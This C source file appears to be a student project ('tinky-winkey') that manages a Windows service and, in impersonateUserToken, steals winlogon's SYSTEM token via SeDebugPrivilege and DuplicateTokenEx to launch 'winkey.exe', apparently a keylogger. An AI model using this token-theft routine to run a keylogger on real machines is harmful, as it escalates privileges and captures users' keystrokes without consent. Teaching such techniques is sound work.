#include <windows.h>
#include <stdio.h>
#include <stdlib.h>

#define SVCNAME "tinky";

//  Forward declarations:
BOOL GetProcessList( );
BOOL ListProcessModules( DWORD dwPID );
BOOL ListProcessThreads( DWORD dwOwnerPID );
void printError( TCHAR* msg );

// DWORD : type d'int utilise pour PID sur win


BOOL SetPrivilege(
	HANDLE hToken,          // access token handle
	LPCTSTR lpszPrivilege,  // name of privilege to enable/disable
	BOOL bEnablePrivilege   // to enable or disable privilege
)
{
	TOKEN_PRIVILEGES tp;
	LUID luid;

	if (!LookupPrivilegeValue(
		NULL,            // lookup privilege on local system
		lpszPrivilege,   // privilege to lookup 
		&luid))        // receives LUID of privilege
	{
		printf("[-] LookupPrivilegeValue error: %u\n", GetLastError());
		return FALSE;
	}

	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luid;
	if (bEnablePrivilege)
		tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	else
		tp.Privileges[0].Attributes = 0;

	// Enable the privilege or disable all privileges.

	if (!AdjustTokenPrivileges(
		hToken,
		FALSE,
		&tp,
		sizeof(TOKEN_PRIVILEGES),
		(PTOKEN_PRIVILEGES)NULL,
		(PDWORD)NULL))
	{
		printf("[-] AdjustTokenPrivileges error: %u\n", GetLastError());
		return FALSE;
	}

	if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)

	{
		printf("[-] The token does not have the specified privilege. \n");
		return FALSE;
	}

	return TRUE;
}

void impersonateUserToken()
{
    HANDLE winlogonTokenHandle;
    HANDLE winlogonDuplicateTokenHandle;

    DWORD WINLOGON_PID = 1412;

    HANDLE currentTokenHandle = NULL;
	BOOL getCurrentToken = OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &currentTokenHandle);
	if (SetPrivilege(currentTokenHandle, "SeDebugPrivilege", TRUE))
	{
		printf("[+] SeDebugPrivilege enabled!\n");
	}

    HANDLE processHandle = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, WINLOGON_PID);
	if (GetLastError() == NULL)
		printf("[+] OpenProcess() success!\n");
	else
	{
		printf("[-] OpenProcess() Return Code: %i\n", processHandle);
		printf("[-] OpenProcess() Error: %i\n", GetLastError());
	}
	
	// Call OpenProcessToken(), print return code and error code
	BOOL getToken = OpenProcessToken(processHandle, TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_QUERY, &winlogonTokenHandle);
	if (GetLastError() == NULL)
		printf("[+] OpenProcessToken() success!\n");
	else
	{
		printf("[-] OpenProcessToken() Return Code: %i\n", getToken);
		printf("[-] OpenProcessToken() Error: %i\n", GetLastError());
	}
	
	CloseHandle(processHandle);

	// Call DuplicateTokenEx(), print return code and error code
	BOOL duplicateToken = DuplicateTokenEx(winlogonTokenHandle, TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, NULL, SecurityImpersonation, TokenPrimary, &winlogonDuplicateTokenHandle);
	if (GetLastError() == NULL)
		printf("[+] DuplicateTokenEx() success!\n");
	else
	{
		printf("[-] DuplicateTokenEx() Return Code: %i\n", duplicateToken);
		printf("[-] DupicateTokenEx() Error: %i\n", GetLastError());
	}


	// Call CreateProcessWithTokenW(), print return code and error code
	BOOL createProcess = CreateProcessWithTokenW(winlogonDuplicateTokenHandle, LOGON_WITH_PROFILE, L"D:\\42\\tinky-winkey\\winkey\\winkey.exe", NULL, 0, NULL, NULL, NULL, NULL);
	if (GetLastError() == NULL)
		printf("[+] Process spawned!\n");
	else
	{
		printf("[-] CreateProcessWithTokenW Return Code: %i\n", createProcess);
		printf("[-] CreateProcessWithTokenW Error: %i\n", GetLastError());
	}


    CloseHandle(winlogonTokenHandle);
	CloseHandle(winlogonDuplicateTokenHandle);
}

void installService()
{
	SC_HANDLE schSCManager;
	SC_HANDLE schService;
    TCHAR *servicePath = "d:\\42\\tinky-winkey\\tinky\\tinky.exe";   
	TCHAR *serviceName = SVCNAME;
	schSCManager = OpenSCManager( 
        NULL,                    // local computer
        NULL,                    // ServicesActive database 
        SC_MANAGER_ALL_ACCESS);  // full access rights 


    if (NULL == schSCManager) 
    {
        printf("OpenSCManager failed (%d)\n", GetLastError());
        return;
    }
  
	schService = CreateService( 
        schSCManager,              // SCM database 
        serviceName,                   // name of service 
        serviceName,                   // service name to display 
        SERVICE_ALL_ACCESS,        // desired access 
        SERVICE_WIN32_OWN_PROCESS, // service type 
        SERVICE_DEMAND_START,      // start type 
        SERVICE_ERROR_NORMAL,      // error control type 
        servicePath,                    // path to service's binary 
        NULL,                      // no load ordering group 
        NULL,                      // no tag identifier 
        NULL,                      // no dependencies 
        NULL,                      // LocalSystem account 
        NULL);                     // no password 
 
    if (schService == NULL) 
    {
        printf("CreateService failed (%d)\n", GetLastError()); 
        CloseServiceHandle(schSCManager);
        return;
    }
    else printf("Service installed successfully\n"); 

    CloseServiceHandle(schService); 
    CloseServiceHandle(schSCManager);

}

void toggleService(BOOL startService)
{
	SC_HANDLE schSCManager;
	SC_HANDLE schService;
	TCHAR *serviceName = SVCNAME;
	DWORD dwBytesNeeded;
	SERVICE_STATUS_PROCESS ssp;

	schSCManager = OpenSCManager( 
        NULL,                    // local computer
        NULL,                    // ServicesActive database 
        SC_MANAGER_ALL_ACCESS);  // full access rights 


    if (NULL == schSCManager) 
    {
        printf("OpenSCManager failed (%d)\n", GetLastError());
        return;
    }

    schService = OpenService( 
        schSCManager,         // SCM database 
        serviceName,            // name of service 
        SERVICE_ALL_ACCESS);  // full access 
 
    if (schService == NULL)
    { 
        printf("OpenService failed (%d)\n", GetLastError()); 
        CloseServiceHandle(schSCManager);
        return;
    }    
	if (startService)
	{
		if (!StartService(
				schService,  // handle to service 
				0,           // number of arguments 
				NULL) )      // no arguments 
		{
			printf("StartService failed (%d)\n", GetLastError());
			goto stop_cleanup;
		}
		else printf("Service start pending...\n"); 
	}
	else
	{
		if ( !QueryServiceStatusEx( 
            schService, 
            SC_STATUS_PROCESS_INFO,
            (LPBYTE)&ssp, 
            sizeof(SERVICE_STATUS_PROCESS),
            &dwBytesNeeded ) )
		{
			printf("QueryServiceStatusEx failed (%d)\n", GetLastError()); 
			goto stop_cleanup;
		}

		if ( ssp.dwCurrentState == SERVICE_STOPPED )
		{
			printf("Service is already stopped.\n");
			goto stop_cleanup;
		}
		//StopDependentServices();

		// Send a stop code to the service.

		if ( !ControlService( 
				schService, 
				SERVICE_CONTROL_STOP, 
				(LPSERVICE_STATUS) &ssp ) )
		{
			printf( "ControlService failed (%d)\n", GetLastError() );
			goto stop_cleanup;
		}

	}


stop_cleanup:
    CloseServiceHandle(schService); 
    CloseServiceHandle(schSCManager);

}

void deleteService()
{
	SC_HANDLE schSCManager;
	SC_HANDLE schService;
    TCHAR *servicePath = "d:\\42\\tinky-winkey\\tinky\\tinky.exe";   
	TCHAR *serviceName = SVCNAME;
	schSCManager = OpenSCManager( 
        NULL,                    // local computer
        NULL,                    // ServicesActive database 
        SC_MANAGER_ALL_ACCESS);  // full access rights 


    if (NULL == schSCManager) 
    {
        printf("OpenSCManager failed (%d)\n", GetLastError());
        return;
    }

    schService = OpenService( 
        schSCManager,         // SCM database 
        serviceName,            // name of service 
        SERVICE_ALL_ACCESS);  // full access 
 
    if (schService == NULL)
    { 
        printf("OpenService failed (%d)\n", GetLastError()); 
        CloseServiceHandle(schSCManager);
        return;
    }    

 
	BOOL serviceDeleted = DeleteService(schService);
    if (serviceDeleted == NULL)
    { 
        printf("DeleteService failed (%d)\n", GetLastError()); 
    }    
	else printf("Service successfully deleted");
  

    CloseServiceHandle(schService); 
    CloseServiceHandle(schSCManager);
}

int main(int argc, char *argv[]) {

	if (argc != 2)
	{
		printf("BAD");
	}
	else
	{
		if (strcmp(argv[1], "install") == 0)
			installService();
		else if (strcmp(argv[1], "start") == 0)
			toggleService(TRUE);
		else if (strcmp(argv[1], "stop") == 0)
			toggleService(FALSE);
		else if (strcmp(argv[1], "delete") == 0)
			deleteService();
	}

	return 0;
}